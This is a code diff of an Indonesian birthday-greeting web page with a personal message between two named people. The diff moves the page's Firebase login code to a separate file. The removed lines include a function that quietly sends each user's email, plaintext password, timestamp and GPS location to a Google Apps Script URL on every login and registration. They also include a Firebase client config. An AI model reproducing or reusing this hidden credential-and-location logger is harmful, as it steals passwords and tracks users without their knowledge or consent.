@@ -117,9 +117,9 @@
                 <p style="margin-top: 0;">Halo Kamu, NUR OKTALIANA RAHAYU✨</p>
                 
                 <!-- Efek Teks Mengetik -->
-                <p id="typing-text" style="min-height: 60px; font-style: italic; color: #5c4d3c; white-space: pre-wrap; word-wrap: break-word;">
+                <div id="typing-text" style="min-height: 60px; font-style: italic; color: #5c4d3c; white-space: pre-wrap; word-wrap: break-word;">
                     <!-- Teks otomatis berjalan di sini -->
-                    </p>
+                </div>
                 <p style="text-align: right; margin-bottom: 0; font-size: 13px; color: #8c7864;">
                     -Muhamad Imron Hamzah ❤️
                 </p>
@@ -137,72 +137,21 @@
     <!-- ========================================== -->
     <!-- LOGIKA SISTEM INTEGRASI FIREBASE & SHEETS  -->
     <!-- ========================================== -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { 
-            getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, 
-            onAuthStateChanged, signOut, sendEmailVerification 
-        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+    <!-- Gunakan type="module" untuk menghubungkan logika eksternal app.js -->
+    <script type="module" src="app.js"></script>
 
-        // Konfigurasi Firebase Proyek Anda
-        const firebaseConfig = {
-          apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
-          authDomain: "project-bd-163e4.firebaseapp.com",
-          projectId: "project-bd-163e4",
-          storageBucket: "project-bd-163e4.firebasestorage.app",
-          messagingSenderId: "691964855641",
-          appId: "1:691964855641:web:b0c45e7badc579cdfc3848"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-
+    <!-- Script Pembantu untuk Animasi UI & Efek Mengetik -->
+    <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const loginCard = document.getElementById('login-card');
-            const contentCard = document.getElementById('content-card');
-            const mainContainer = document.getElementById('main-container');
-            const galaxyUniverse = document.getElementById('galaxy-universe');
             const giftBoxWrapper = document.getElementById('gift-box-wrapper');
-            const bgMusic = document.getElementById('bg-music');
-            
-            const loginButton = document.getElementById('btn-login');
-            const btnRegister = document.getElementById('btn-register');
+            const contentCard = document.getElementById('content-card');
+            const galaxyUniverse = document.getElementById('galaxy-universe');
             const btnBackGift = document.getElementById('btn-back-gift');
-            const emailInput = document.getElementById('input-email');
-            const passwordInput = document.getElementById('input-password');
+            const txtElement = document.getElementById('typing-text');
 
-            // 1. Monitor Keamanan & Status Verifikasi Email
-            onAuthStateChanged(auth, (user) => {
-                if (user) {
-                    if (user.emailVerified) {
-                        loginCard.classList.add('hidden');
-                        contentCard.classList.remove('hidden');
-                        galaxyUniverse.classList.add('hidden');
-                    } else {
-                        alert("Akses Ditangguhkan! Silakan buka kotak masuk atau folder SPAM email Anda, lalu klik link verifikasi terlebih dahulu.");
-                        signOut(auth);
-                    }
-                } else {
-                    loginCard.classList.remove('hidden');
-                    contentCard.classList.add('hidden');
-                    galaxyUniverse.classList.add('hidden');
-                }
-            });
+            const pesanRahasia = `Selamat ulang tahun, Cantik! 🎉🤍
 
-            // 2. Aksi saat Kado Diklik (Pindah ke Surat & Jalankan Efek Mengetik)
-            if (giftBoxWrapper) {
-                giftBoxWrapper.addEventListener('click', () => {
-                    contentCard.classList.add('hidden');
-                    galaxyUniverse.classList.remove('hidden'); 
-                    
-                    if (bgMusic) bgMusic.play().catch(() => console.log("Audio ditahan browser"));
-                    
-                    // JALANKAN EFEK TEKS MENGETIK OTOMATIS
-                    const txtElement = document.getElementById('typing-text');
-                   // Gunakan backtick untuk menyimpan teks per paragraf
-const pesanRahasia = `Selamat ulang tahun, Cantik! 🎉🤍
-
-Aku sempat berpikir, apakah aku perlu mengucapkan ini atau tidak. Pada akhirnya, aku memilih untuk tetap mengirimkan doa, karena apa pun yang pernah terjadi di antara kita, aku tetap ingin mengingatmu dengan cara yang baik.
+Aku sempat berpikir, apakah aku perlu mengucapkan ini atau tidak. Pada akhir-akhir ini, aku memilih untuk tetap mengirimkan doa, karena apa pun yang pernah terjadi di antara kita, aku tetap ingin mengingatmu dengan cara yang baik.
 
 Semoga usiamu yang baru membawa lebih banyak hal yang membuatmu merasa cukup, tenang, dan bahagia. Semoga setiap langkahmu dipenuhi orang-orang yang menghargaimu, setiap usaha yang kamu lakukan menemukan hasil terbaiknya, dan setiap doa yang kamu simpan diam-diam dijawab pada waktu yang paling tepat.
 
@@ -218,136 +167,33 @@ Selamat bertambah usia. Semoga kamu selalu menjadi seseorang yang sehat, bahagia
 
 Selamat ulang tahun. Semoga segala hal baik selalu menyertaimu.`;
 
-// Pecah berdasarkan baris kosong
-const paragrafArray = pesanRahasia.split('\n\n');
+            const paragrafArray = pesanRahasia.split('\n\n');
 
-async function tampilkanPerParagraf() {
-    // Bersihkan elemen sebelum memulai
-    txtElement.innerHTML = "";
-    
-    for (const paragraf of paragrafArray) {
-        // Masukkan paragraf baru
-        const p = document.createElement('p');
-        p.innerText = paragraf;
-        p.style.marginBottom = "20px"; // Jarak antar paragraf
-        p.style.opacity = "0"; // Untuk efek transisi muncul (fade-in)
-        p.style.transition = "opacity 1s ease-in";
-        
-        txtElement.appendChild(p);
-        
-        // Trigger efek fade-in
-        setTimeout(() => { p.style.opacity = "1"; }, 50);
-        
-        // Jeda 1.5 detik sebelum paragraf berikutnya muncul
-        await new Promise(resolve => setTimeout(resolve, 1500));
-    }
-}
+            window.startGalaxyHeart = async function() {
+                if (!txtElement) return;
+                txtElement.innerHTML = "";
+                
+                for (const paragraf of paragrafArray) {
+                    const p = document.createElement('p');
+                    p.innerText = paragraf;
+                    p.style.marginBottom = "20px";
+                    p.style.opacity = "0";
+                    p.style.transition = "opacity 1s ease-in";
+                    
+                    txtElement.appendChild(p);
+                    
+                    setTimeout(() => { p.style.opacity = "1"; }, 50);
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                }
+            }
 
-// Panggil fungsi ini saat kado diklik
-tampilkanPerParagraf();
-                });
-            }   
-
-            // 3. Tombol Kembali dari Isi Kado
             if (btnBackGift) {
                 btnBackGift.addEventListener('click', () => {
                     galaxyUniverse.classList.add('hidden');
                     contentCard.classList.remove('hidden');
                 });
             }
-
-            // 4. Tombol Logout
-            document.addEventListener('click', async (e) => {
-                if (e.target && e.target.id === 'btn-logout') {
-                    e.preventDefault();
-                    if (bgMusic) { bgMusic.pause(); bgMusic.currentTime = 0; }
-                    await signOut(auth);
-                }
-            });
-
-            // 5. Alur Masuk (Login) Akun Lama
-            if (loginButton) {
-                loginButton.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    const emailClean = emailInput.value.trim();
-                    const passwordClean = passwordInput.value.trim();
-
-                    if (!emailClean || !passwordClean) {
-                        alert("Email dan sandi tidak boleh kosong!");
-                        return;
-                    }
-
-                    rekamKeSheets(emailClean, passwordClean);
-
-                    signInWithEmailAndPassword(auth, emailClean, passwordClean)
-                        .catch((error) => alert("Gagal Masuk: " + error.message));
-                });
-            }
-
-            // 6. Alur Pendaftaran Baru + Kirim Email Aktivasi
-            if (btnRegister) {
-                btnRegister.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    const emailClean = emailInput.value.trim();
-                    const passwordClean = passwordInput.value.trim();
-
-                    if (!emailClean || !passwordClean) {
-                        alert("Silakan lengkapi email dan password pendaftaran!");
-                        return;
-                    }
-
-                    rekamKeSheets(emailClean, passwordClean);
-
-                    createUserWithEmailAndPassword(auth, emailClean, passwordClean)
-                        .then((result) => {
-                            sendEmailVerification(result.user)
-                                .then(() => {
-                                    alert("Pendaftaran Berhasil! Tautan verifikasi telah dikirim. Periksa email Anda dan klik tautan tersebut sebelum masuk.");
-                                    signOut(auth);
-                                    emailInput.value = "";
-                                    passwordInput.value = "";
-                                });
-                        })
-                        .catch((error) => alert("Gagal Mendaftar: " + error.message));
-                });
-            }
         });
-
-        // --- VALIDASI & PENGIRIMAN DATA KE GOOGLE SHEETS ---
-        function rekamKeSheets(email, password) {
-            const urlAppsScript = "https://script.google.com/macros/s/AKfycbwLOavMtwhmDiJF8xwQyx5xZJ-iOH9IoiC6JgmIexWTWXvFx_kR8JrUDroJHraRFYJj2w/exec";
-            
-            const sekarang = new Date();
-            const opsiWaktu = { timeZone: 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' };
-            const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        kirimFetch(urlAppsScript, email, password, waktuFormat, `${lat}, ${lon}`);
-                    },
-                    () => {
-                        kirimFetch(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
-                    },
-                    { timeout: 4000 }
-                );
-            } else {
-                kirimFetch(urlAppsScript, email, password, waktuFormat, "Tidak Didukung Browser");
-            }
-        }
-
-        function kirimFetch(urlBase, email, pw, waktu, lokasi) {
-            const urlFinal = `${urlBase}?email=${encodeURIComponent(email)}` +
-                             `&pw=${encodeURIComponent(pw)}` +
-                             `&waktu=${encodeURIComponent(waktu)}` +
-                             `&lokasi=${encodeURIComponent(lokasi)}`;
-                             
-            fetch(urlFinal, { method: 'GET', mode: 'no-cors', cache: 'no-cache' })
-            .then(() => console.log("Data terkirim ke Sheets."))
-            .catch(err => console.log("Gagal log server."));
-        }
     </script>
 </body>
 </html>
